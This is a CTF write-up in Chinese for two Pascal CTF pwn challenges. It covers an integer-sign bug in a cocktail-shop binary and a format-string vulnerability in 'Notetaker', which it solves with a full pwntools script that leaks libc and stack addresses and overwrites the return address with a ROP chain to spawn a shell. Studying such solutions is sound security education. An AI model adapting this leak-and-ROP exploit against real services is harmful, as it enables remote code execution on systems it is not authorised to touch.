---
title: Pascal CTF 2025
date: 2026-02-01
tags: CTF
---

### malta


#### Decompile

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+18h] [rbp-E8h] BYREF
  unsigned int v5; // [rsp+1Ch] [rbp-E4h] BYREF
  _DWORD dirk_list[12]; // [rsp+20h] [rbp-E0h]
  _QWORD v7[10]; // [rsp+50h] [rbp-B0h] BYREF
  _QWORD v8[11]; // [rsp+A0h] [rbp-60h]
  int i; // [rsp+F8h] [rbp-8h]
  int v10; // [rsp+FCh] [rbp-4h]

  v8[0] = "Margarita";
  v8[1] = "Mojito";
  v8[2] = "Gin lemon";
  v8[3] = "PascalCTF26";
  v8[4] = "Cosmopolitan";
  v8[5] = "Lavander Collins";
  v8[6] = "Japanese slipper";
  v8[7] = "Blue angel";
  v8[8] = "Martini";
  v8[9] = "Flag";
  v7[0] = "Tequila & lime";
  v7[1] = "Minty & refreshing";
  v7[2] = "Gin with lemon";
  v7[3] = "Secret challenge ;)";
  v7[4] = "Cranberry & vodka";
  v7[5] = "Lavender twist";
  v7[6] = "Melon & citrus";
  v7[7] = "Blue & sweet";
  v7[8] = "Classic & dry";
  v7[9] = &unk_4014C1;
  dirk_list[0] = 6;
  dirk_list[1] = 6;
  dirk_list[2] = 5;
  dirk_list[3] = 6;
  dirk_list[4] = 6;
  dirk_list[5] = 4;
  dirk_list[6] = 5;
  dirk_list[7] = 6;
  dirk_list[8] = 3;
  dirk_list[9] = 1000000000;
  v10 = 100;
  init((__int64)v7);
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0OXMMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKolkXWMMMMMMMMMMMMMMMMMMMMMMMXkloKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:;lkXWMMMMMMMMMMMMMMMMMMWXkl;:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,;lkXWMMMMMMMMMMMMMMMXkl;,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,;lkXWMMMMMMMMMMWXkl;,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,;lkXMMMMMMMWXkl;,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,;lkXWMMWXkl;,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,;lkKKkl;,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,;;;;,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("XKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXKX");
  puts("XOoloxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kdoloOX");
  puts("MMNkl;,;:coxk0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kxoc:;,;lkXWM");
  puts("MMMWXkl;,,,,,;:codk0KNWMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,;lkXWMMM");
  puts("MMMMMWXkl;,,,,,,,,,;:codk0KNWMMMMMMMMMMMMMMMMWO:,,,,:OWMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,;lkNMMMMMM");
  puts("MMMMMMMWXkl;,,,,,,,,,,,,,;:codk0KNWMMMMMMMMMMMNd;,,;dNMMMMMMMMMMMWNX0kxoc:;,,,,,,,,,,,,,;lkNMMMMMMMM");
  puts("MMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,;:coxk0XNWMMMMMMKl,,lKMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,;lkXMMMMMMMMMM");
  puts("MMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,;:coxk0XNWWkllOWWNX0kxoc:;,,,,,,,,,,,,,,,,,,,,,;lkNMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMWXd;,,,,,,,,,,,,,,,,,,,,,,,,,,;:cdkOOOOkdl:;,,,,,,,,,,,,,,,,,,,,,,,,,,;dXWMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,,,;:coxk0KOxxOK0kxoc:;,,,,,,,,,,,,,,,,,,,,,,,;lkXWMMMMMMMMMMMM");
  puts("MMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,;:coxk0XNWMMMNd:;dNMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,,,;lkXWMMMMMMMMMM");
  puts("MMMMMMMMMXkl;,,,,,,,,,,,,,,,;:coxk0KNWMMMMMMMMWO:,,:OWMMMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,;lkXWMMMMMMMM");
  puts("MMMMMMMXkl;,,,,,,,,,,,;:coxk0KNWMMMMMMMMMMMMMMKl,,,,lKWMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,,,;lkXWMMMMMM");
  puts("MMMMMXkl;,,,,,,,;:coxk0XNWMMMMMMMMMMMMMMMMMMMNd;,,,,;dNMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,;lkXMMMMM");
  puts("MMMXkl;,,,;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,;lkXWMM");
  puts("WXkl;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kdoc:;lkXW");
  puts("KOxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kxkK");
  puts("WWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,;lddl;,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,;lkXWWXkl;,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,;lkNMMMMMMNkl;,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,;lkXMMMMMMMMMWXkl;,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,;lkNMMMMMMMMMMMMMMXkl;,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,;lkNMMMMMMMMMMMMMMMMMWXkl;,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;lkXMMMMMMMMMMMMMMMMMMMMMMXkl;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOdkXWMMMMMMMMMMMMMMMMMMMMMMMMWXkdOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0KWWMMMMMMMMMMMMMMMMMMMMMMMMMMMWK0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM");
  puts("Welcome in Malta, here you're to buy some of the cheapest cocktails in the world!");
  while ( 1 )
  {
    printf("Your balance is: %d €\n", v10);
    for ( i = 0; i <= 9; ++i )
      printf("%d. Drink: %s for %d €\n", i + 1, (const char *)v8[i], dirk_list[i]);
    puts("11. Exit\n");
    printf("Select a drink: ");
    __isoc23_scanf("%d", &v5);
    if ( --v5 == 10 )
      break;
    if ( v5 <= 0xA )
    {
      printf("How many drinks do you want? ");
      __isoc23_scanf("%d", &v4);
      if ( v10 >= dirk_list[v5] * v4 )
      {
        v10 -= dirk_list[v5] * v4;
        printf(
          "You bought %d %s for %d € and the barman told you its secret recipe: %s\n",
          v4,
          (const char *)v8[v5],
          v4 * dirk_list[v5],
          (const char *)v7[v5]);
      }
      else
      {
        puts("You don't have enough money!");
      }
      sleep(2u);
    }
    else
    {
      puts("Invalid choice");
    }
  }
  puts("Bye bye!");
  return 0;
}
```

***init()***

在 ***init()*** 這邊讀取 *flag*

```
__int64 __fastcall init(__int64 a1)
{
  __int64 result; // rax

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  *(_QWORD *)(a1 + 72) = getenv("FLAG");
  result = *(_QWORD *)(a1 + 72);
  if ( !result )
  {
    puts("No flag found");
    exit(1);
  }
  return result;
}
```

發現 `flag` 需要購買，錢不夠

```sh
Welcome in Malta, here you're to buy some of the cheapest cocktails in the world!
Your balance is: 100 €
1. Drink: Margarita for 6 €
2. Drink: Mojito for 6 €
3. Drink: Gin lemon for 5 €
4. Drink: PascalCTF26 for 6 €
5. Drink: Cosmopolitan for 6 €
6. Drink: Lavander Collins for 4 €
7. Drink: Japanese slipper for 5 €
8. Drink: Blue angel for 6 €
9. Drink: Martini for 3 €
10. Drink: Flag for 1000000000 €
11. Exit

```

在程式碼中(***v10 -= dirk_list[v5] * v4;***)因為沒有對 `v4` (飲料數) 做下界檢查，所以我們可以要**負數**讓我們的錢增加

```C
      if ( v10 >= dirk_list[v5] * v4 )
      {
        v10 -= dirk_list[v5] * v4;
        printf(
          "You bought %d %s for %d € and the barman told you its secret recipe: %s\n",
          v4,
          (const char *)v8[v5],
          v4 * dirk_list[v5],
          (const char *)v7[v5]);
      }
```
增加後就可以直接購買 ***flag***





### Notetaker


***decompile***

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+4h] [rbp-11Ch] BYREF
  char *init_chunk; // [rsp+8h] [rbp-118h]
  char note[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init();
  memset(note, 0, 0x100uLL);
  do
  {
    menu();
    init_chunk = (char *)malloc(0x10uLL);
    memset(init_chunk, 0, 0x10uLL);
    fgets(init_chunk, 16, stdin);
    _isoc99_sscanf(init_chunk, "%d", &choice);
    free(init_chunk);
    switch ( choice )
    {
      case 2:
        printf("Enter the note: ");
        read(0, note, 256uLL);
        note[strcspn(note, "\n")] = 0;
        break;
      case 3:
        memset(note, 0, 0x100uLL);
        puts("Note cleared.");
        break;
      case 1:
        printf(note);
        putchar(10);
        break;
    }
  }
  while ( choice > 0 && choice <= 4 );
  return 0;
}
```

在 case 1 存在 formate string 的問題，而且是無限次的 format string，條件很寬鬆，


```c
case 1:
    printf(note);
    putchar(10);
    break;
```

基本想法，先使用 formate string 的任意讀 *leak libc base address* 以及 *stack address*，在把 ROP chain 填到 main() 的 return address

> 最後遇到一個小問題

本地使用 `rop_payload = fmtstr_payload(fmt_offset, writes, write_size='int')` 可以過，但 *remote* 不知道是不能一次寫那麼多 *bytes* 還是什麼問題，過不了，改成 *short* 就可以了 `rop_payload = fmtstr_payload(fmt_offset, writes, write_size='short')`






```python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug' 
binary_path = './notetaker'
#p = process(binary_path)
p = remote("notetaker.ctf.pascalctf.it",9002)
libc = ELF("./libc.so.6")
#---------------- LEAK libc----------------#
pop_rdi = 0x400c03
system_offset = 0x453a0
leak_libc_base_payload = "%43$p"
p.sendlineafter(">",str(2))
p.sendlineafter(": ",leak_libc_base_payload)
p.sendlineafter(">",str(1))
raw_data = p.recvline().strip()
libc_address = int(raw_data, 16)
libc_address =libc_address & 0xFFFFFFFFFFF00000
success("libc_address-->"+ hex(libc_address))
#---------------- LEAK system address----------------#
system = libc_address + system_offset
success("system-->" + hex(system))
bin_sh_addr = next(libc.search(b'/bin/sh'))
bin_sh_addr += libc_address
success("bin_sh_addr-->" + hex(bin_sh_addr))
#---------------- LEAK STACK----------------#
leak_stack_base_payload = "%40$p"
p.sendlineafter(">",str(2))
p.sendlineafter(": ",leak_stack_base_payload)
p.sendlineafter(">",str(1))
raw_data = p.recvline().strip()
stack_address = int(raw_data, 16)
success("stack address-->" + hex(stack_address))

stack_offset = 0xd8


fmt_offset = 8 
target_addr_ret = stack_address - 0xd8

success("return address -->"+hex(target_addr_ret))
writes = {
    target_addr_ret:      pop_rdi,    
    target_addr_ret+8:      bin_sh_addr,      
    target_addr_ret+16:      system      


}

rop_payload = fmtstr_payload(fmt_offset, writes, write_size='short')

print(f"[*] Payload Length: {len(rop_payload)} bytes")

p.sendlineafter(">",str(2))
p.sendlineafter(": ",rop_payload)   

p.sendlineafter(">",str(1)) # trigger format string attack
p.sendlineafter(">",str(0)) # get shell

#gdb.attach(p)
p.interactive()

# leave;ret; 0x400B94
```
